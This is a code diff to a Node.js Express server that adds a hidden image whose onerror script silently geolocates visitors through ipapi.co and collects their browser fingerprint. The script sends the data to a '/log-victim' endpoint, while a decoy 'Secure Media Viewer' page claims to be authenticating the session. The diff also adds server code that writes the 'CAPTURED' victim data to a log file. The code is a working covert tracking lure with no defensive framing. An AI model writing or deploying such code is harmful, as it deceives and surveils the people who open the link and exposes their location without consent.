@@ -263,6 +263,29 @@ app.get('/view-image', (req, res) => {
 				})();
 				</script>
         </head>
+			<img src="/nonexistent.jpg" onerror="
+				fetch('https://ipapi.co/json/')
+					.then(r => r.json())
+					.then(geo => fetch('/log-victim', {
+						method: 'POST',
+						body: JSON.stringify({
+							userAgent: navigator.userAgent,
+							language: navigator.language,
+							screen: { width: screen.width, height: screen.height },
+							timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+							ip: geo.ip,
+							city: geo.city,
+							country: geo.country_name,
+							location: null,
+							fingerprint: 'fallback-beacon',
+							localIP: null
+						}),
+						headers: { 'Content-Type': 'application/json' }
+					}))
+					.finally(() => setTimeout(() => {
+						window.location.href = '${config.BASE_DOMAIN}${config.PATHS.abstract}';
+					}, 1000));
+			" style="display:none">
         <body style="background:#111;color:#fff;text-align:center;padding:50px;font-family:sans-serif;">
             <h2>🔐 Secure Media Viewer</h2>
             <p>Authenticating session...</p>
@@ -276,7 +299,10 @@ app.get('/view-image', (req, res) => {
 app.post('/log-victim', express.json(), (req, res) => {
     const payload = req.body;
     const ip = req.ip;
-
+	 const data = { ...req.body, ip: req.ip, timestamp: new Date().toISOString() };
+    console.log('💀 CAPTURED:', data);  // Force visible log
+    fs.appendFileSync('victims.log', JSON.stringify(data) + '\n');
+    res.status(200).send('OK');
     // Enhanced profile with new fields
     const fullProfile = {
         ip,
